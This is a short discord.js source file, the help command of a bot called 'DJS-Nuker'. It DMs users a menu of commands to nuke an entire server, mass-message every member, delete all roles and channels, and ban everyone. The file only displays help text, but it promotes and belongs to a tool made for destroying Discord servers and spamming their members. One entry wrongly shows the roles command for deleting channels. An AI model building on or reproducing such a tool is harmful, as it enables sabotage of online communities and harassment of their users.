const Discord = require("discord.js");

const ownerids = require('../ownerids.json')

module.exports.run = async(bot, message, args) => {

    message.delete(1000);

    const help = new Discord.RichEmbed()

    .setTitle("DJS-Nuker | Help Command")

    .setDescription("https://github.com/Setinal/DJS-Nuker")

    .setColor("33FFC6")

    .addField("> GitHub", "**https://github.com/Setinal/**")

    .addField("> Nuke", "**>nuke to nuke the whole server!**")
    
    .addField("> Dmall", "**>dmall (message) to message everyone with a specified message!**")
    
    .addField("> Deleteroles", "**>deleteroles to delete all roles!**")

    .addField("> Deletechannels", "**>deleteroles to delete all channels!**")

    .addField("> Banall", "**>banall to ban everyone in a discord server!**")

    .setFooter("Made with love by setinal!")

    message.author.send(help);

    

}